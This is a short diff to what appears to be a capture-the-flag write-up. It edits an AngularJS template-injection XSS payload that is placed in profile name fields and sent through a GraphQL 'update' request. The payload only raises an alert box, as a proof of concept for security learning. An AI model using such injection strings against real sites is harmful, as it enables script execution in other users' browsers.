@@ -150,7 +150,7 @@ It seems to be the admin asking us to send a link to verify that we are a valid 
 
 Another thing to note is that the field "First Name" and "Last Name" in the Profile page are vulnerable to XSS. We can update our first name to:
 ```JavaScript
-{%{{{$on.constructor('alert("XSS")')()}}}%}
+{%{{$on.constructor('alert("XSS")')()}}%}
 ```
 It wil trigger the XSS:
 ![](images/image05.png)
@@ -160,7 +160,7 @@ An interesthing this to note is the POST request sent to `/graphql` when we upda
 {
     "operationName": "update",
     "variables": {
-        "firstname": "{{%{{$on.constructor('alert(\"XSS\")')()}}}%}",
+        "firstname": "{%{{$on.constructor('alert(\"XSS\")')()}}%}",
         "lastname": "null",
         "id": "62abdc0aa77046041da68167",
         "newusername": "caue"
